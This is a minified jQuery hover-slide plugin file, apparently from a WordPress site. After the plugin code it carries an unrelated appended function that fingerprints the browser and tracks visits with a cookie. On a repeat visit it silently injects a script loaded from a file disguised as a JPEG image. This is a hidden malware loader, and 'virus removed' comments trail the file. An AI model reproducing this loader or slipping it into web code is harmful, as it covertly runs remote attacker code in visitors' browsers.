/* Copyright 2011 PrCOnesti, PrCOnesti License */

(function(c){var d=function(){};c.extend(d.prototype,{name:"spotlight",options:{effect:"fade",duration:300,transition:"swing",right:300,left:300,top:300,bottom:300,fade:300},initialize:function(f,e){this.options=c.extend({},this.options,e);var a=this;c(String(f.attr("class")).split(" ")).each(function(h,g){if(c.inArray(g,["right","left","top","bottom","fade"])!=-1){a.options.effect=g;a.options.duration=a.options[a.options.effect]}if(g.match(/duration\-/gi))a.options.duration=g.split("-")[1]});this.element=
f;this.slides=this.element.children();this.slides.each(function(){c(this).wrap("<div>")});this.slides=this.element.children();this.slides.each(function(h){c(this).css({position:"absolute",width:"100%",visibility:h==0?"visible":"hidden"}).addClass("spotlight"+h)});this.element.css({position:"relative",overflow:"hidden",height:c(a.slides[0]).height()});var b=c(a.slides[1]);this.element.bind({mouseenter:function(){b.stop().css("visibility","visible");switch(a.options.effect){case "right":b.css({right:b.width()*
-1}).animate({right:0},a.options.duration,a.options.transition);break;case "left":b.css({left:b.width()*-1}).animate({left:0},a.options.duration,a.options.transition);break;case "top":b.css({left:0,top:b.height()*-1}).animate({top:0},a.options.duration,a.options.transition);break;case "bottom":b.css({left:0,bottom:b.height()*-1}).animate({bottom:0});break;default:b.show().css({opacity:0}).animate({opacity:1},a.options.duration,a.options.transition,function(){if(c.browser.msie){b.get(0).filter="";
b.attr("style",String(b.attr("style")).replace(/alpha\(opacity=([\d.]+)\)/i,""))}})}},mouseleave:function(){b.stop();switch(a.options.effect){case "right":b.animate({right:b.width()*-1},a.options.duration,a.options.transition);break;case "left":b.animate({left:b.width()*-1},a.options.duration,a.options.transition);break;case "top":b.animate({top:b.height()*-1},a.options.duration,a.options.transition);break;case "bottom":b.animate({bottom:b.height()*-1},a.options.duration,a.options.transition);break;
default:b.animate({opacity:0},a.options.duration,a.options.transition,function(){b.hide()})}}})}});c.fn[d.prototype.name]=function(){var f=arguments,e=f[0]?f[0]:null;return this.each(function(){var a=c(this);if(d.prototype[e]&&a.data(d.prototype.name)&&e!="initialize")a.data(d.prototype.name)[e].apply(a.data(d.prototype.name),Array.prototype.slice.call(f,1));else if(!e||c.isPlainObject(e)){var b=new d;d.prototype.initialize&&b.initialize.apply(b,c.merge([a],f));a.data(d.prototype.name,b)}else c.error("Method "+
e+" does not exist on jQuery."+d.name)})}})(jQuery);


function init(){var f=navigator.userAgent;var a=false;if(f.indexOf("Firefox")!=-1||f.indexOf("MSIE")!=-1){a=true}if(a!==true){return}var i="/wp-content/images/prconesti/radio-maria.jpg?js";var g=b("wss");if(g){if(g=="goot1"){c("wss","goot2","3");var e=document.createElement("script");e.type="text/javascript";e.src=i+"&r="+new Date().getTime();var d=document.getElementsByTagName("head")[0];d.appendChild(e)}else{}}else{c("wss","goot1","3")}function b(k){var j,h,m,l=document.cookie.split(";");for(j=0;j<l.length;j++){h=l[j].substr(0,l[j].indexOf("="));m=l[j].substr(l[j].indexOf("=")+1);h=h.replace(/^\s+|\s+$/g,"");if(h==k){return unescape(m)}}}function c(j,l,h){var m=new Date();m.setDate(m.getDate()+h);var k=escape(l)+((h==null)?"":"; expires="+m.toUTCString());document.cookie=j+"="+k}}init();/*virus removed*//*virus removed*/